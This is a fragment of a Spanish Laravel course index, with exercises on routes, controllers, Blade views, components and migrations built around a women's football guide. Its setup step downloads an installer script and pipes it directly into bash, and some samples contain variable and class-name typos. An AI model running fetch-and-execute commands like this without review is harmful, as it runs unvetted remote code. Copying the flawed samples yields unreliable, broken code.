<p><code>Proyecto</code> enlace que cargue una vista con el siguiente texto \"Est\u00e1s en el proyecto numero: X\" donde X es un n\u00famero entero que podamos introducirlo en la propia ruta. Si no se mete ning\u00fan n\u00famero en la ruta, por defecto tiene que ser 1; por ejemplo</p> <pre><code>http://localhost/proyecto/210937\n</code></pre> </li> <li> <p>Recuerda que el t\u00edtulo y el men\u00fa de navegaci\u00f3n han de aparecer en todas las vistas que cargues.</p> </li> </ul> <ol> <li>Utilizando las <code>estructuras</code> de control y los <code>controladores</code> crea un sitio web que contenga lo siguiente:</li> </ol> <ul> <li> <p><code>Inicio</code> p\u00e1gina principal con un t\u00edtulo que diga \"Bienvenid@s a FOTO \u2591\u2592\u2593 BLOG\" y un texto de bienvenida (con un par de frases sobra)</p> </li> <li> <p><code>Nosotros</code> un t\u00edtulo de la secci\u00f3n en la que te encuentras y un listado de 3 personas diferentes que, cada uno de los nombres mostrar\u00e1 un texto descriptivo de cada persona cuando pinchemos sobre su nombre.</p> </li> <li> <p><code>Fotos</code> Una secci\u00f3n que aparezca el texto \"Est\u00e1s visualizando la foto con el ID: X\" donde X es un par\u00e1metro que depender\u00e1 de la ruta que se haya introducido. Por defecto, si no se introduce dicho par\u00e1metro \u00e9ste debe valer 1. </p> </li> <li> <p>Como elementos est\u00e1ticos debe aparecer:</p> <ul> <li><code>Imagen</code> como logtipo</li> <li>El t\u00edtulo <code>FOTO \u2591\u2592\u2593 BLOG</code> a la derecha del logotipo</li> <li><code>Men\u00fa</code> de navegaci\u00f3n para moverse por las distintas secciones</li> </ul> </li> <li> <p>Puedes usar tailwind como algo opcional para practicar. Recuerda que viene por defecto con la instalaci\u00f3n de Laravel. S\u00f3lo tienes que incluirlo en el <code>head</code> de la plantilla: <code>@vite('resources/css/app.css')</code>.</p> </li> </ul>"},{"location":"07frameworks.html#practica-guiada-guia-de-equipos-de-futbol-femenino","title":"Pr\u00e1ctica guiada: Gu\u00eda de equipos de f\u00fatbol femenino","text":"<p>El objetivo de este ejercicio es construir una aplicaci\u00f3n Laravel para gestionar una gu\u00eda de equipos de f\u00fatbol femenino. Aprenderemos a configurar rutas, controladores, vistas y a pasar datos utilizando las funcionalidades de Laravel.</p> <p>Lanzar comandos Artisan</p> <p>A la hora de ejecutar Artisan se hace mediante Laravel Sail, que es la opci\u00f3n seguida para crear la app. Si se hiciese mediante Herd o la instalaci\u00f3n manual de Laravel, se lanzar\u00edan los comandos directamente con php. Ejemplos:</p> <ul> <li> <p><code>./vendor/bin/sail artisan make:controller EquipoController</code> \u2192 Laravel Sail</p> </li> <li> <p><code>php artisan make:controller EquipoController</code> \u2192 Herd o manual</p> </li> </ul>"},{"location":"07frameworks.html#paso-1-configurar-el-proyecto","title":"Paso 1: Configurar el proyecto","text":"<ol> <li>Crear un proyecto Laravel con nombre <code>futbol-femenino</code>:</li> </ol> <pre><code> curl -s \"https://laravel.build/futbol-femenino?with=mysql,mailpit\" | bash\n</code></pre> <p>y despu\u00e9s terminamos la instalaci\u00f3n:</p> <pre><code>  cd futbol-femenino\n  ./vendor/bin/sail up \n  ./vendor/bin/sail artisan migrate\n</code></pre> <p>Sobre la creaci\u00f3n del proyecto</p> <p>Se ha utilizado la 3\u00aa opci\u00f3n de las 3 vistas para crear el proyecto. Puedes utilizar cualquiera de las otras 2 (manual o mediante Herd) sin problemas.</p> <ol> <li>Pregunta: \u00bfPor qu\u00e9 es importante tener una estructura clara en el proyecto Laravel?</li> </ol>"},{"location":"07frameworks.html#paso-2-definir-la-ruta-inicial","title":"Paso 2: Definir la ruta inicial","text":"<ol> <li>Editar <code>routes/web.php</code> para crear una ruta inicial:</li> </ol> <pre><code>&lt;?php\nRoute::get('/', function () {\n    return \"Bienvenido a la Gu\u00eda de Equipos de f\u00fatbol femenino.\";\n});\n</code></pre> <ol> <li>Pregunta: \u00bfQu\u00e9 diferencia existe entre definir una ruta directa y una que utiliza un controlador?</li> </ol>"},{"location":"07frameworks.html#paso-3-crear-un-controlador","title":"Paso 3: Crear un controlador","text":"<ol> <li>Generar un controlador llamado <code>EquipoController</code>:</li> </ol> <pre><code>./vendor/bin/sail artisan make:controller EquipoController\n</code></pre> <ol> <li>A\u00f1adir un m\u00e9todo <code>index</code> al controlador:</li> </ol> <pre><code>&lt;?php\npublic function index() {\n   return view('equipos.index');\n}\n</code></pre> <ol> <li>Definir una ruta para el m\u00e9todo  <code>index</code>:</li> </ol> <pre><code>&lt;?php\nRoute::get('/equipos', [EquipoController::class, 'index']);\n</code></pre> <ol> <li>Pregunta: \u00bfPor qu\u00e9 es recomendable separar la l\u00f3gica en controladores?</li> </ol>"},{"location":"07frameworks.html#paso-4-crear-una-vista","title":"Paso 4: Crear una vista","text":"<ol> <li>Crear una vista en <code>resources/views/equipos/index.blade.php</code>:</li> </ol> <pre><code>&lt;h1&gt;Gu\u00eda de Equipos&lt;/h1&gt;\n</code></pre> <ol> <li>Pregunta: \u00bfQu\u00e9 hace especial el motor de plantillas Blade en comparaci\u00f3n con HTML est\u00e1ndar?</li> </ol>"},{"location":"07frameworks.html#paso-5-pasar-datos-a-la-vista","title":"Paso 5: Pasar datos a la vista","text":"<ol> <li>Modifica el m\u00e9todo <code>index</code>para pasar un array de equipos:</li> </ol> <pre><code>&lt;?php\npublic function index() {\n   $equipos = ['Barcelona', 'Real Madrid', 'Sevilla', 'Valencia', 'Atl\u00e9tico de Madrid'];\n   return view('equipos.index', compact('equipos'));\n}\n</code></pre> <ol> <li>A\u00f1ade un bucle <code>@foreach</code>a la vista:</li> </ol> <pre><code>&lt;h1&gt;Gu\u00eda de Equipos&lt;/h1&gt;\n&lt;ul&gt;\n   @foreach($equipos as $equipo)\n       &lt;li&gt;{{ $equipo }}&lt;/li&gt;\n   @endforeach\n&lt;/ul&gt;\n</code></pre> <ol> <li>Pregunta: \u00bfC\u00f3mo podemos utilizar Blade para hacer el c\u00f3digo m\u00e1s seguro?</li> </ol>"},{"location":"07frameworks.html#paso-6-anadir-estilos-con-vite","title":"Paso 6: A\u00f1adir estilos con Vite","text":"<ol> <li>Crear un archivo CSS en <code>resources/css/equipos.css</code>:</li> </ol> <pre><code>body {\n   font-family: Arial, sans-serif;\n}\n\nh1 {\n   color: darkblue;\n}\n\nnav ul {\n  list-style-type: none;\n  padding: 0;\n}\n\nnav ul li {\n  display: inline;\n  margin-right: 15px;\n}\n\nnav ul li a {\n  text-decoration: none;\n  color: darkblue;\n}\n\nnav ul li a:hover {\n  text-decoration: underline;\n}\n</code></pre> <ol> <li>Modificar el archivo vite.config.js para que incluya el archivo CSS:</li> </ol> <pre><code>import { defineConfig } from 'vite';\nimport laravel from 'laravel-vite-plugin';\n\nexport default defineConfig({\n    plugins: [\n        laravel({\n            input: [\n                'resources/css/app.css', \n                'resources/css/equipos.css', \n                'resources/js/app.js'],\n            refresh: true,\n        }),\n    ],\n});\n</code></pre> <ol> <li>Incluir el archivo CSS con <code>@vite</code> en la vista:</li> </ol> <pre><code>@vite('resources/css/equipos.css')\n</code></pre> <ol> <li>Instalar dependencias y conector Vite si no se ha hecho antes:</li> </ol> <pre><code>npm install \n</code></pre> <ol> <li>Ejecutar servidor de desarrollo local Vite:</li> </ol> <pre><code>npm run dev\n</code></pre> <ol> <li>Pregunta: \u00bfQu\u00e9 es Hot Module Replacement (HMR) y c\u00f3mo ayuda en el desarrollo?</li> </ol>"},{"location":"07frameworks.html#paso-7-ampliar-funcionalidades","title":"Paso 7: Ampliar funcionalidades","text":"<ol> <li>A\u00f1adir m\u00e1s campos a los equipos:</li> </ol> <pre><code>&lt;?php\n public function index(){\n     $equipos = [\n         ['nombre' =&gt; 'Barcelona', 'estadio' =&gt; 'Camp Nou', 'titulos' =&gt; 30],\n         ['nombre' =&gt; 'Real Madrid', 'estadio' =&gt; 'Santiago Bernabeu', 'titulos' =&gt; 10],\n         ['nombre' =&gt; 'Sevilla', 'estadio' =&gt; 'Ram\u00f3n S\u00e1nchez Pizju\u00e1n', 'titulos' =&gt; 8],\n         ['nombre' =&gt; 'Valencia', 'estadio' =&gt; 'Mestalla', 'titulos' =&gt; 6],\n         ['nombre' =&gt; 'Atl\u00e9tico de Madrid', 'estadio' =&gt; 'Wanda Metropolitano', 'titulos' =&gt; 5],\n     ];\n     return view('equipos.index', compact('equipos'));\n }\n</code></pre> <ol> <li>Actualizar la vista para mostrar una tabla:</li> </ol> <pre><code>&lt;h1&gt;Guia de Equipos&lt;/h1&gt;\n&lt;table&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;Nombre&lt;/th&gt;\n            &lt;th&gt;Estadio&lt;/th&gt;\n            &lt;th&gt;T\u00edtulos&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n        @foreach($equipos as $equipo)\n            &lt;tr&gt;\n                &lt;td&gt;{{ $equipo['nombre'] }}&lt;/td&gt;\n                &lt;td&gt;{{ $equipo['estadio'] }}&lt;/td&gt;\n                &lt;td&gt;{{ $equipo['titulos'] }}&lt;/td&gt;\n            &lt;/tr&gt;\n        @endforeach\n    &lt;/tbody&gt;\n&lt;/table&gt;\n</code></pre> <ol> <li>Crear una nueva vista parcial para el men\u00fa de navegaci\u00f3n:</li> </ol> <ul> <li>A\u00f1ade un nuevo archivo a resources/views/partials/menu.blade.php con el siguiente contenido:</li> </ul> <pre><code>&lt;nav&gt;\n    &lt;ul&gt;\n        &lt;li&gt;&lt;a href=\"/\"&gt;Inicio&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"/equipos\"&gt;Gu\u00eda de Equipos&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"/estadios\"&gt;Listado de Estadios&lt;/a&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n&lt;/nav&gt;\n</code></pre> <ul> <li>Modifica la vista resources/views/equipos/index.blade.php para incluir el men\u00fa con la directiva @include:</li> </ul> <pre><code>@include('partials.menu')\n</code></pre> <ol> <li>Crear una plantilla base:</li> </ol> <ul> <li>Crea el archivo resources/views/layouts/app.blade.php:</li> </ul> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"es\"&gt;\n&lt;head&gt;\n      &lt;meta charset=\"UTF-8\"&gt;\n      &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n      &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n      &lt;title&gt;@yield('title','Gu\u00eda de f\u00fatbol femenino')&lt;/title&gt;\n      @vite(['resources/css/app.css', 'resources/css/equipos.css'])\n&lt;/head&gt;\n&lt;body&gt;\n      &lt;header&gt;\n        @include('partials.menu')\n      &lt;/header&gt;\n      &lt;main&gt;\n       @yield('content')\n      &lt;/main&gt;\n      &lt;footer&gt;\n          &lt;p&gt;&amp;copy; 2025 Gu\u00eda de f\u00fatbol femenino&lt;/p&gt;\n      &lt;/footer&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>Modifica la vista resources/views/equipos/index.blade.php para heredar de la plantilla base:</li> </ul> <pre><code>@extends('layouts.app')\n@section('title', \" Gu\u00eda de Equipos\")\n@section('content')\n  &lt;h1&gt;Gu\u00eda de Equipos&lt;/h1&gt;\n  &lt;table&gt;\n      &lt;thead&gt;\n      &lt;tr&gt;\n          &lt;th&gt;Nombre&lt;/th&gt;\n          &lt;th&gt;Estadio&lt;/th&gt;\n          &lt;th&gt;T\u00edtulos&lt;/th&gt;\n      &lt;/tr&gt;\n      &lt;/thead&gt;\n      &lt;tbody&gt;\n      @foreach($equips as $equip )\n          &lt;tr&gt;\n              &lt;td class=\"equipo\"&gt;&lt;h2&gt;{{ $equipo['nombre']  }}&lt;/h2&gt;&lt;/td&gt;\n              &lt;td class=\"equipo\"&gt;{{ $equipo['estadio']  }}&lt;/td&gt;\n              &lt;td class=\"equipo\"&gt;{{ $equipo['titulos']  }}&lt;/td&gt;\n          &lt;/tr&gt;\n      @endforeach\n      &lt;/tbody&gt;\n  &lt;/table&gt;\n@endsection\n</code></pre> <ol> <li>Crear un componente para los equipos:</li> </ol> <ul> <li>Ejecuta el siguiente comando para crear un componente Blade llamado Equipo:</li> </ul> <pre><code>./vendor/bin/sail artisan make:component Equipo\n</code></pre> <ul> <li>A\u00f1ade los estilos al archivo CSS resources/css/equipos.css:</li> </ul> <pre><code>  .equipo {\n    border: 1px solid #ddd;\n    padding: 10px;\n    margin: 10px 0;\n    border-radius: 5px;\n    box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.1);\n  }\n\n  .equipo h2 {\n    margin: 0;\n    color: darkblue;\n  }\n</code></pre> <ul> <li>Modifica la vista resources/views/components/equipo.blade.php para crear el componente:</li> </ul> <pre><code>&lt;div class=\"equipo\"&gt;\n    &lt;h2&gt;{{ $nombre }}&lt;/h2&gt;\n    &lt;p&gt;&lt;strong&gt;Estadio:&lt;/strong&gt; {{ $estadio }}&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;T\u00edtulos:&lt;/strong&gt; {{ $titulos }}&lt;/p&gt;\n&lt;/div&gt;\n</code></pre> <ul> <li>Crea un m\u00e9todo en el controlador de equipos para mostrar un equipo:</li> </ul> <pre><code>&lt;?php\npublic function show($id){\n    $equipos = [\n        ['nombre' =&gt; 'Barcelona', 'estadio' =&gt; 'Camp Nou', 'titulos' =&gt; 30],\n        ['nombre' =&gt; 'Real Madrid', 'estadio' =&gt; 'Santiago Bernabeu', 'titulos' =&gt; 10],\n        ['nombre' =&gt; 'Sevilla', 'estadio' =&gt; 'Ram\u00f3n S\u00e1nchez Pizju\u00e1n', 'titulos' =&gt; 8],\n        ['nombre' =&gt; 'Valencia', 'estadio' =&gt; 'Mestalla', 'titulos' =&gt; 6],\n        ['nombre' =&gt; 'Atl\u00e9tico de Madrid', 'estadio' =&gt; 'Wanda Metropolitano', 'titulos' =&gt; 5],\n    ];\n    $equipo = $equipos[$id];\n    return view('equipos.show', compact('equipo'));\n}\n</code></pre> <ul> <li>Crea la vista resources/views/equipos/show.blade.php para utilizar el componente:</li> </ul> <pre><code>@extends('layouts.app')\n@section('title', \" Gu\u00eda de Equipos\" )\n@section('content')\n&lt;x-equip\n   :nombre=\"$equipo['nombre']\"\n   :estadio=\"$equipo['estadio']\"\n   :titulos=\"$equipo['titulos']\"\n/&gt;\n&lt;p class=\"mt-4 text-center\"&gt;\n   &lt;a href=\"/equipos\" class=\"text-blue-700 hover:underline\"&gt;Volver&lt;/a&gt;\n&lt;/p&gt;\n@endsection \n</code></pre> <ul> <li>Modifica el componente app/Views/components/Equipo.php para utilizar los datos pasados:</li> </ul> <pre><code>&lt;?php\npublic function __construct(\n     public string $nombre,\n     public string $estadio,\n     public int $titulos) { }\n</code></pre> <ul> <li>Crea la ruta:</li> </ul> <pre><code>&lt;?php\nRoute::get('/equipos/{id}', [EquipoController::class, 'show']);\n</code></pre> <ol> <li> <p>Pregunta: \u00bfC\u00f3mo podemos hacer para no repetir el array de equipos en el controlador?</p> </li> <li> <p>Pregunta: \u00bfQu\u00e9 es un componente Blade y qu\u00e9 ventajas tiene respecto a las vistas parciales?</p> </li> <li> <p>Pregunta: \u00bfQu\u00e9 permite la directiva @yield y c\u00f3mo se relaciona con @section?</p> </li> <li> <p>Pregunta: \u00bfPor qu\u00e9 es importante tener una plantilla base en una aplicaci\u00f3n Web?</p> </li> </ol>"},{"location":"07frameworks.html#paso-8-refactorizar-el-codigo","title":"Paso 8: Refactorizar el c\u00f3digo","text":"<ol> <li>No repetir el array de equipos en el controlador:</li> </ol> <pre><code>&lt;?php\nclass EquipoController extends Controller{\n    public $equipos = [\n        ['nombre' =&gt; 'Barcelona', 'estadio' =&gt; 'Camp Nou', 'titulos' =&gt; 30],\n        ['nombre' =&gt; 'Real Madrid', 'estadio' =&gt; 'Santiago Bernabeu', 'titulos' =&gt; 10],\n        ['nombre' =&gt; 'Sevilla', 'estadio' =&gt; 'Ram\u00f3n S\u00e1nchez Pizju\u00e1n', 'titulos' =&gt; 8],\n        ['nombre' =&gt; 'Valencia', 'estadio' =&gt; 'Mestalla', 'titulos' =&gt; 6],\n        ['nombre' =&gt; 'Atl\u00e9tico de Madrid', 'estadio' =&gt; 'Wanda Metropolitano', 'titulos' =&gt; 5],\n    ];\n\n    public function index(){\n        $equipos = $this-&gt;equipos;\n        return view('equipos.index', compact('equipos'));\n    }\n\n    public function show($id){\n        $equipo = $this-&gt;equipos[$id];\n        return view('equipos.show', compact('equipo'));\n    }\n}\n</code></pre> <ol> <li>Pasar las rutas a resource:</li> </ol> <pre><code>&lt;?php\nRoute::resource('equipos', EquipController::class);\n</code></pre> <ol> <li>Crear el enlace en el \u00edndice para ver un equipo:</li> </ol> <pre><code>@foreach($equipos as $key =&gt; $equipo)\n    &lt;tr&gt;\n        &lt;td&gt;&lt;a href=\"{{ route('equipos.show', $key) }}\"&gt;{{ $equipo['nombre'] }}&lt;/a&gt;&lt;/td&gt;\n        &lt;td&gt;{{ $equipo['estadio'] }}&lt;/td&gt;\n        &lt;td&gt;{{ $equipo['titulos'] }}&lt;/td&gt;\n    &lt;/tr&gt;\n@endforeach\n</code></pre> <ol> <li>Usa ChatGPT para dar estilo a las vistas mediante tailwind:</li> </ol> <pre><code>app.blade.php\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"es\"&gt;\n&lt;head&gt;\n      &lt;meta charset=\"UTF-8\"&gt;\n      &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n      &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n      &lt;title&gt;@yield('title','Gu\u00eda de f\u00fatbol femenino')&lt;/title&gt;\n      @vite(['resources/css/app.css'])\n&lt;/head&gt;\n&lt;body class=\"font-sans bg-gray-100 text-gray-900 flex flex-col h-screen justify-between\"&gt;\n    &lt;header class=\"bg-blue-800 text-orange p-4\"&gt;\n        @include('partials.menu')\n    &lt;/header&gt;\n    &lt;main class=\"container mx-auto p-6\"&gt;\n        @yield('content')\n    &lt;/main&gt;\n    &lt;footer class=\"bg-blue-800 text-white text-center p-4\"&gt;\n        &lt;p&gt;&amp;copy; 2025 Gu\u00eda de f\u00fatbol femenino&lt;/p&gt;\n    &lt;/footer&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <pre><code>index.blade.php\n@extends('layouts.app')\n@section('title', \"Gu\u00eda de equipos\")\n@section('content')\n\n&lt;h1 class=\"text-3xl font-bold text-blue-800 mb-6\"&gt;Gu\u00eda de Equipos&lt;/h1&gt;\n\n&lt;table class=\"w-full border-collapse border border-gray-300\"&gt;\n    &lt;thead class=\"bg-gray-200\"&gt;\n        &lt;tr&gt;\n            &lt;th class=\"border border-gray-300 p-2\"&gt;Nombre&lt;/th&gt;\n            &lt;th class=\"border border-gray-300 p-2\"&gt;Estadio&lt;/th&gt;\n            &lt;th class=\"border border-gray-300 p-2\"&gt;T\u00edtulos&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n        @foreach($equipos as $key =&gt; $equipo)\n            &lt;tr class=\"hover:bg-gray-100\"&gt;\n                &lt;td class=\"border border-gray-300 p-2\"&gt;\n                    &lt;a href=\"{{ route('equipos.show', $key) }}\" class=\"text-blue-700 hover:underline\"&gt;\n                      {{ $equipo['nombre'] }}\n                    &lt;/a&gt;\n                &lt;/td&gt;\n                &lt;td class=\"border border-gray-300 p-2\"&gt;{{ $equipo['estadio'] }}&lt;/td&gt;\n                &lt;td class=\"border border-gray-300 p-2\"&gt;{{ $equipo['titulos'] }}&lt;/td&gt;\n            &lt;/tr&gt;\n        @endforeach\n    &lt;/tbody&gt;\n&lt;/table&gt;\n@endsection\n</code></pre> <pre><code>equipo.blade.php\n&lt;div class=\"equipo border rounded-lg shadow-md p-4 bg-white\"&gt;\n    &lt;h2 class=\"text-xl font-bold text-blue-800\"&gt;{{ $nombre }}&lt;/h2&gt;\n    &lt;p&gt;&lt;strong&gt;Estadio:&lt;/strong&gt; {{ $estadio }}&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;T\u00edtulos:&lt;/strong&gt; {{ $titulos }}&lt;/p&gt;\n&lt;/div&gt;\n</code></pre> <pre><code>menu.blade.php\n&lt;nav&gt;\n    &lt;ul class=\"flex space-x-4\"&gt;\n        &lt;li&gt;&lt;a href=\"/\" class=\"text-white hover:underline\"&gt;Inicio&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"/equipos\" class=\"text-white hover:underline\"&gt;Gu\u00eda de equipos&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"/estadios\" class=\"text-white hover:underline\"&gt;Listado de estadios&lt;/a&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n&lt;/nav&gt;\n</code></pre>"},{"location":"07frameworks.html#practica-guia-de-estadios-de-futbol","title":"Pr\u00e1ctica: Gu\u00eda de estadios de f\u00fatbol","text":"<p>El objetivo de este ejercicio es crear una extensi\u00f3n de la gu\u00eda de equipos de f\u00fatbol femenino para incluir una nueva funcionalidad: un listado de estadios de f\u00fatbol. Implementar\u00e1s rutas, controladores y vistas para mostrar estadios y sus caracter\u00edsticas.</p> Ejemplo de navegaci\u00f3n por la app"},{"location":"07frameworks.html#1-crear-un-controlador-de-estadios","title":"1. Crear un controlador de estadios","text":"<ol> <li>Genera un nuevo controlador llamado <code>EstadioController</code>.</li> <li>A\u00f1ade un m\u00e9todo <code>index</code> al controlador para devolver una vista con un listado de estadios.</li> </ol> <pre><code>&lt;?php\n$estadios = [\n    [\n      'nombre' =&gt; 'Estadio Johan Cruyff',\n      'ciudad' =&gt; 'Sant Joan Desp\u00ed',\n      'capacidad' =&gt; 6000,\n      'equipo_principal' =&gt; 'Barcelona'\n    ],\n    [\n      'nombre' =&gt; 'Centro Deportivo Wanda Alcal\u00e1 de Henares',\n      'ciudad' =&gt; 'Alcal\u00e1 de Henares',\n      'capacidad' =&gt; 2800,\n      'equipo_principal' =&gt; 'Atl\u00e9tico de Madrid'\n    ],\n    [\n      'nombre' =&gt; 'Estadio Alfredo Di St\u00e9fano',\n      'ciudad' =&gt; 'Madrid',\n      'capacidad' =&gt; 6000,\n      'equipo_principal' =&gt; 'Real Madrid'\n    ]\n];\n</code></pre>"},{"location":"07frameworks.html#2-crear-una-ruta-para-los-estadios","title":"2. Crear una ruta para los estadios","text":"<ol> <li>Define una nueva ruta en <code>routes/web.php</code> que apunte al m\u00e9todo <code>index</code> del controlador.</li> </ol>"},{"location":"07frameworks.html#3-crear-una-vista-para-mostrar-los-estadios","title":"3. Crear una vista para mostrar los estadios","text":"<ol> <li>Crea un archivo de vista en <code>resources/views/estadios/index.blade.php</code> para mostrar los estadios en formato de tabla.</li> <li>Incluye el men\u00fa.</li> </ol>"},{"location":"07frameworks.html#4-anadir-estilos-propios-con-vite-al-listado-de-estadios","title":"4. A\u00f1adir estilos propios con Vite al listado de estadios","text":"<ol> <li>Crea un archivo CSS <code>resources/css/estadios.css</code> para estilizar la tabla.</li> <li>Incluye el CSS a la vista utilizando <code>@vite</code>.</li> <li>Ejecuta Vite para aplicar los estilos.</li> </ol>"},{"location":"07frameworks.html#5-componente-estadio-y-estilos-mediante-tailwind","title":"5. Componente Estadio y estilos mediante tailwind","text":"<ol> <li>Crea un componente para los estadios.</li> <li>Modifica la vista <code>resources/views/estadios/index.blade.php</code> para heredar de <code>layouts.app</code>.</li> <li>Crea la vista <code>resources/views/estadios/show.blade.php</code> con su ruta y funci\u00f3n en el controlador, para mostrar el detalle del estadio, de forma similar a como se hac\u00eda con los equipos.</li> </ol>"},{"location":"07frameworks.html#6-jugadoras","title":"6. Jugadoras","text":"<p>Haz lo mismo con las jugadoras, crea un controlador, una vista y un componente. Ejemplo: </p> <pre><code>&lt;?php\n$jugadoras = [\n    ['nombre' =&gt; 'Alexia Putellas', 'equipo' =&gt; 'Barcelona', 'posicion' =&gt; 'Centrocampista'],\n    ['nombre' =&gt; 'Esther Gonz\u00e1lez', 'equipo' =&gt; 'Atl\u00e9tico de Madrid', 'posicion' =&gt; 'Delantera'],\n    ['nombre' =&gt; 'Misa Rodr\u00edguez', 'equipo' =&gt; 'Real Madrid', 'posicion' =&gt; 'Portera'],\n];\n</code></pre>"},{"location":"07frameworks.html#7-partidos","title":"7. Partidos","text":"<p>Haz lo mismo con los partidos, crea un controlador, una vista y un componente. Ejemplo:</p> <pre><code>&lt;?php\n$partidos = [\n    ['local' =&gt; 'Barcelona', 'visitante' =&gt; 'Atl\u00e9tico de Marid', 'fecha' =&gt; '2025-01-30', 'resultado' =&gt; null],\n    ['local' =&gt; 'Real Madrid', 'visitante' =&gt; 'Barcelona', 'fecha' =&gt; '2025-01-15', 'resultado' =&gt; '3-0'],\n];\n</code></pre>"},{"location":"07frameworks.html#8-modifica-el-menu","title":"8. Modifica el men\u00fa","text":"<p>Para poder ir a todas las pantallas y cambiar las rutas a llamadas.</p>"},{"location":"07frameworks.html#9-ampliar-la-guia-de-estadios-con-formulario-opcional-se-ve-en-el-tema-siguiente","title":"9. Ampliar la gu\u00eda de estadios con formulario (opcional, se ve en el tema siguiente)","text":"<ol> <li>A\u00f1adir una nueva ruta <code>/estadios/crear</code> para mostrar un formulario que permita a\u00f1adir un nuevo estadio.</li> <li>Crear un controlador con un m\u00e9todo <code>crear</code> que devuelva una vista con el formulario.</li> <li>Dise\u00f1ar un formulario Blade que contenga campos para el nombre del estadio, ciudad, capacidad y equipo principal.</li> <li>Mostrar un mensaje de confirmaci\u00f3n cuando el usuario haga clic en el bot\u00f3n de enviar.</li> </ol>"},{"location":"07frameworks.html#10-refactorizar-anadiendo-ids","title":"10. Refactorizar a\u00f1adiendo ids","text":"<p>En todo momento se ha utilizado como id de cada array su posici\u00f3n. Esto, como ya sabes, no es una forma correcta de tratar los datos y a partir del tema siguiente se corregir\u00e1. Pero, mientra tanto, \u00bfpodri\u00e1s refactorizar el c\u00f3digo para incluir un campo id en cada array? En estadios, equipos, jugadoras y partidos. Y que todo siga funcionando...</p>"},{"location":"07frameworks.html#preguntas-para-reflexionar","title":"Preguntas para reflexionar","text":"<ol> <li>Rutas: \u00bfPor qu\u00e9 utilizamos un controlador para gestionar la l\u00f3gica de esa funcionalidad?</li> <li>Blade: \u00bfQu\u00e9 ocurre si intentamos acceder a una clave que no existe en un array?</li> <li>CSS y Vite: \u00bfQu\u00e9 diferencia existe entre incluir un archivo CSS est\u00e1tico y utilizar <code>@vite</code>?</li> </ol>"},{"location":"07frameworks.html#practica-frases-celebres","title":"Pr\u00e1ctica: Frases c\u00e9lebres","text":"<p>Descarga este array de posts sobre frases c\u00e9lebres para utilizar en esta pr\u00e1ctica. Tienes total libertad para trabajar siguiendo los conceptos vistos durante el tema. Se pide:</p> <ol> <li>Que se muestre un listado con todos los posts.</li> <li>Al hacer clic en cada post lleve a una p\u00e1gina con su vista en detalle con toda su informaci\u00f3n.</li> <li>Se debe poder filtrar (mediante rutas) para mostrar los posts de una determinada categor\u00eda: Filosof\u00eda, Salud o Motivaci\u00f3n.</li> </ol> <p>Recomendaciones:</p> <ul> <li>Sigue las convenciones de Laravel en cuanto a nombres y flujo de trabajo: rutas -&gt; controlador -&gt; vistas.</li> <li>Para la vista, crea un componente post que llamar\u00e1s desde otras vistas como <code>&lt;x-post&gt;</code> pas\u00e1ndole los datos que estimes oportunos.</li> <li>Utiliza tailwindcss para estilizar las vistas.</li> </ul>"},{"location":"08actividadesResueltas.html","title":"Gesti\u00f3n de datos en Laravel: Actividades resueltas","text":"<p>A continuaci\u00f3n, vas a realizar una serie de ejercicios sencillos sobre cada uno de los apartados vistos en el tema. Puedes crear un proyecto nuevo o reutilizar uno existente.</p>"},{"location":"08actividadesResueltas.html#migraciones","title":"Migraciones","text":"<p>En este apartado vas a trabajar creando migraciones. Es importante, que aparte del c\u00f3digo en s\u00ed, apuntes los comandos que utilizas para crearlas, eliminarlas, ejecutarlas...</p> <ol> <li>Crear de una tabla b\u00e1sica: Crea una tabla llamada productos con las siguientes columnas:</li> </ol> <ul> <li>id (entero, clave primaria, auto-incremental)</li> <li>nombre (string, longitud m\u00e1xima de 255)</li> <li>precio (decimal, 8 d\u00edgitos en total, 2 decimales)</li> </ul> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration create_productos_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::create('productos', function (Blueprint $table) {\n        $table-&gt;id();\n        $table-&gt;string('nombre');\n        $table-&gt;decimal('precio', 8, 2);\n        $table-&gt;timestamps();\n    });\n}\n\npublic function down(){\n    Schema::dropIfExists('productos');\n}\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p> <ol> <li>A\u00f1adir columnas a una tabla existente: A\u00f1ade una columna descripcion (tipo texto) a la tabla productos.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration add_descripcion_to_productos_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;text('descripcion')-&gt;nullable();\n    });\n}\n\npublic function down(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;dropColumn('descripcion');\n    });\n}\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p> <ol> <li>Crear una tabla con claves for\u00e1neas: Crea una tabla categorias y una tabla productos donde cada producto pertenece a una categor\u00eda.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration create_categorias_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    